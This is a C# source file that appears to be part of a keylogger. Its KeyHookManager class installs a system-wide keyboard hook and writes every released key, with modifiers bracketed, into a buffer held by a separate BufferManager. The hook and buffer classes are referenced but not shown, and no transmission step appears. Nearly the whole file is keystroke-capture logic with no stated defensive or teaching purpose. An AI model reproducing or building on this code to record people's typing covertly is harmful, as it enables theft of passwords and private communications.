using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;
using Buffer;

namespace KeyHook
{
    public class KeyHookManager
    {
        #region Memebers

        private GlobalKeyboardHook gkh = null;
       
        #endregion

        #region Constructors

        /// <summary>
        /// 
        /// </summary>
        public KeyHookManager()
        {
            //Initialize the memebers
            gkh = new GlobalKeyboardHook();
        }

        #endregion

        #region Public Methods

        /// <summary>
        /// 
        /// </summary>
        public void Start()
        {
            if (gkh != null)
            {
                gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
                gkh.KeyUp += new KeyEventHandler(gkh_KeyUp);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        public void Stop()
        {
            if (gkh != null)
            {
                gkh.KeyDown -= new KeyEventHandler(gkh_KeyDown);
                gkh.KeyUp -= new KeyEventHandler(gkh_KeyUp);
            }
        }

        #endregion

        #region Global Key hook Events

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void gkh_KeyUp(object sender, KeyEventArgs e)
        {
             if (GlobalKeyboardHook.IsModifier((int)e.KeyCode))
                BufferManager.GetInstance().Write("[" + e.KeyCode.ToString() + "]");
            else
                 BufferManager.GetInstance().Write(e.KeyCode.ToString());
            //e.Handled = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            //Do nothing
            //Do something
            //e.Handled = true;
        }

        #endregion

    }
}
